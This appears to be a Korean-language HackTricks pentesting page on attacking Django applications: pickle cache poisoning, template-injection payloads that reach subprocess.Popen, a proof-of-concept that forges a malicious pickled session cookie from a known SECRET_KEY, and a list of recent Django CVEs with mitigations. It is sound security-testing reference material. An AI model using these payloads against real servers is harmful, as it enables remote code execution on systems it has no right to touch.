# Django

{{#include ../../banners/hacktricks-training.md}}

## 캐시 조작을 통한 RCE
Django의 기본 캐시 저장 방식은 [Python pickles](https://docs.python.org/3/library/pickle.html)이며, [untrusted input is unpickled](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf)될 경우 RCE로 이어질 수 있습니다. **공격자가 캐시에 대한 쓰기 권한을 얻을 수 있다면, 이 취약점을 기반 서버에서의 RCE로 확대할 수 있습니다.**

Django 캐시는 [Redis](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/redis.py#L12), [memory](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/locmem.py#L16), [files](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/filebased.py#L16), 또는 [database](https://github.com/django/django/blob/48a1929ca050f1333927860ff561f6371706968a/django/core/cache/backends/db.py#L95)에 저장됩니다. Redis 서버나 database에 저장된 캐시는 가장 가능성 높은 공격 벡터(SQL injection 및 Redis injection)이지만, 파일 기반 캐시를 이용해 임의 쓰기를 RCE로 전환할 수도 있습니다. Maintainers는 이를 non-issue로 표시했습니다. 캐시 파일 폴더, SQL 테이블명, Redis 서버 세부정보는 구현에 따라 달라진다는 점을 유의하세요.

이 HackerOne 리포트는 SQLite database에 저장된 Django 캐시를 악용하는 훌륭하고 재현 가능한 예제를 제공합니다: https://hackerone.com/reports/1415436

---

## Server-Side Template Injection (SSTI)
The Django Template Language (DTL) is **Turing-complete**. 만약 사용자 입력 데이터가 *template string*으로 렌더링된다면(예: `Template(user_input).render()`를 호출하거나 `|safe`/`format_html()`로 자동 이스케이프가 제거되는 경우), 공격자는 SSTI → RCE를 완전히 달성할 수 있습니다.

### 탐지
1. `Template()` / `Engine.from_string()` / `render_to_string()`와 같이 *어떤* 미검증 요청 데이터가 포함된 동적 호출을 찾아보세요.
2. 시간 기반 또는 산술 페이로드를 전송하세요:
```django
{{7*7}}
```
렌더된 출력에 `49`가 포함되어 있다면 입력이 템플릿 엔진에 의해 컴파일된 것입니다.

### RCE로 가는 Primitive
Django는 `__import__`에 대한 직접 접근을 차단하지만, Python 객체 그래프에는 접근할 수 있습니다:
```django
{{''.__class__.mro()[1].__subclasses__()}}
```
subprocess.Popen의 인덱스(≈400–500, Python 빌드에 따라 다름)를 찾아 임의의 명령을 실행:
```django
{{''.__class__.mro()[1].__subclasses__()[438]('id',shell=True,stdout=-1).communicate()[0]}}
```
더 안전한 범용 gadget은 `cls.__name__ == 'Popen'`가 될 때까지 반복하는 것이다.

동일한 gadget은 사용자 입력을 잘못 처리하는 **Debug Toolbar** 또는 **Django-CMS**의 템플릿 렌더링 기능에서도 동작한다.

---

### 또한 참조: ReportLab/xhtml2pdf PDF 내보내기 RCE
Django 기반 애플리케이션은 일반적으로 xhtml2pdf/ReportLab을 통합하여 뷰를 PDF로 내보낸다. 사용자 제어 HTML이 PDF 생성으로 흘러들어갈 때, rl_safe_eval은 삼중 괄호 `[[[ ... ]]]` 내부의 표현식을 평가하여 코드 실행을 가능하게 할 수 있다 (CVE-2023-33733). 세부사항, 페이로드, 완화 방안:

{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md
{{#endref}}

---

## Pickle 기반 세션 쿠키 RCE
설정 `SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'`가 활성화되어 있거나 pickle을 역직렬화하는 커스텀 serializer가 사용되는 경우, Django는 뷰 코드를 호출하기 **전에** 세션 쿠키를 *복호화하고 unpickle(역직렬화)* 한다. 따라서 유효한 signing key(기본적으로 프로젝트의 `SECRET_KEY`)만 있으면 즉시 원격 코드 실행이 가능하다.

### Exploit Requirements
* 서버가 `PickleSerializer`를 사용한다.
* 공격자가 `settings.SECRET_KEY`를 알고 있거나 추측할 수 있다 (leaks via GitHub, `.env`, error pages, etc.).

### Proof-of-Concept
```python
#!/usr/bin/env python3
from django.contrib.sessions.serializers import PickleSerializer
from django.core import signing
import os, base64

class RCE(object):
def __reduce__(self):
return (os.system, ("id > /tmp/pwned",))

mal = signing.dumps(RCE(), key=b'SECRET_KEY_HERE', serializer=PickleSerializer)
print(f"sessionid={mal}")
```
결과 cookie를 전송하면 payload는 WSGI worker의 권한으로 실행됩니다.

**Mitigations**: 기본 `JSONSerializer`를 유지하고, `SECRET_KEY`를 주기적으로 교체하며, `SESSION_COOKIE_HTTPONLY`를 설정하세요.

---

## Recent (2023-2025) High-Impact Django CVEs Pentesters Should Check
* **CVE-2025-48432** – *Log Injection via unescaped `request.path`* (fixed June 4 2025). 공격자가 로그 파일에 개행문자/ANSI 코드를 몰래 주입하여 하위 로그 분석을 오염시킬 수 있습니다. Patch level ≥ 4.2.22 / 5.1.10 / 5.2.2.
* **CVE-2024-42005** – *Critical SQL injection* in `QuerySet.values()/values_list()` on `JSONField` (CVSS 9.8). JSON 키를 조작하여 인용을 벗어나 임의의 SQL을 실행할 수 있습니다. Fixed in 4.2.15 / 5.0.8.

항상 정확한 프레임워크 버전을 `X-Frame-Options` 오류 페이지나 `/static/admin/css/base.css` 해시로 식별하고, 해당되는 경우 위 항목들을 테스트하세요.

---

## References
* Django security release – "Django 5.2.2, 5.1.10, 4.2.22 address CVE-2025-48432" – 4 Jun 2025.
* OP-Innovate: "Django releases security updates to address SQL injection flaw CVE-2024-42005" – 11 Aug 2024.
* 0xdf: University (HTB) – Exploiting xhtml2pdf/ReportLab CVE-2023-33733 to gain RCE and pivot into AD – [https://0xdf.gitlab.io/2025/08/09/htb-university.html](https://0xdf.gitlab.io/2025/08/09/htb-university.html)

{{#include ../../banners/hacktricks-training.md}}
